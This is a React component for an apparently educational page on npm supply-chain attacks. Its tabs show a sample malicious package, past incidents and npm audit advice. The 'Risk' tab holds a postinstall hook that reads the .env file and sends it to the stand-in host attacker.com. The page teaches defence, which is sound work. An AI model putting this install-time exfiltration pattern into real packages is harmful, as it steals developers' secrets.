'use client'

import { TabbedCodeBlock } from '@/components/tabbed-code-block'

export function DependenciesDemo() {
  return (
    <div className="my-8 space-y-4">
      <TabbedCodeBlock
        filename="package.json"
        tabs={[
          {
            label: "Risk",
            icon: "risk",
            language: "javascript",
            highlightLines: "4,12-13",
            code: `{
  "name": "malicious-package",
  "scripts": {
    "postinstall": "node steal-secrets.js"
  }
}

// steal-secrets.js
const fs = require('fs')
const https = require('https')

// Steals .env and sends to attacker's server
const secrets = fs.readFileSync('.env', 'utf8')
https.get(\`https://attacker.com?data=\${secrets}\`)

// Runs AUTOMATICALLY when you npm install!`
          },
          {
            label: "Real Cases",
            icon: "info",
            language: "javascript",
            code: `// Real Supply Chain Attacks:

// event-stream (2018)
// - 2M+ downloads/week
// - Injected code to steal Bitcoin

// ua-parser-js (2021)
// - 8M+ downloads/week
// - Installed cryptominer and trojan

// node-ipc (2022)
// - Author intentionally sabotaged
// - Deleted files from Russian users

// These were TRUSTED packages!`
          },
          {
            label: "Audit",
            icon: "audit",
            language: "bash",
            highlightLines: "2,5,10",
            code: `# Audit vulnerabilities
npm audit

# Automatically fix
npm audit fix

# View details
npm audit --json

# Ignore scripts during install
npm install --ignore-scripts

# Best practices:
# • Run npm audit regularly
# • Use Dependabot or Renovate for automatic updates
# • Review dependencies before installing
# • Use package-lock.json for version locking`
          }
        ]}
      />
    </div>
  )
}
